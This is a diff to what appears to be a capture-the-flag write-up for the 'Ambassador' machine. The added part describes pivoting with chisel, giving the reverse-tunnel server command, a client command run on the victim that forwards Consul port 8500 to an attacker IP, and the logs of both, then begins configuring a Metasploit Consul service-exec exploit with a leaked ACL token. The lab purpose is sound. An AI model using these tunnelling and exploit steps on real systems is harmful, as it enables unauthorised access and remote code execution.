@@ -586,6 +586,29 @@ DEBUG = True
 
 To solve this with metasploit we can use the ACL token we found earlier in the .git files and configure the options.
 
+1st lets set up a chisel server so we can forward our data from the host computer to the chisel server, to the local host. AKA pivoting.
+
+Transfer chisel to the victim computer and set it up. (Link below to chisel download)
+
+https://github.com/jpillora/chisel/releases
+
+```console
+└─$ chisel server --reverse --port 1235
+2022/10/05 11:41:25 server: Reverse tunnelling enabled
+2022/10/05 11:41:25 server: Fingerprint uJMyaBsdcjYGgXGDlPhOS2iV5RpiTU7tJ5IjmXTUEL0=
+2022/10/05 11:41:25 server: Listening on http://0.0.0.0:1235
+2022/10/05 11:42:45 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
+2022/10/05 11:42:45 server: session#1: tun: proxy#R:8500=>8500: Listening
+```
+```console
+developer@ambassador:/tmp$ ./chisel2 client 10.10.16.24:1235 R:8500:127.0.0.1:8500
+2022/10/05 16:42:30 client: Connecting to ws://10.10.16.24:1235
+2022/10/05 16:42:31 client: Connected (Latency 30.262281ms)
+```
+Set up our options for the exploit.
+
+Note: I originally tried installing a more recent module of this exploit but it did not work.
+
 ```console
 [msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> options
 
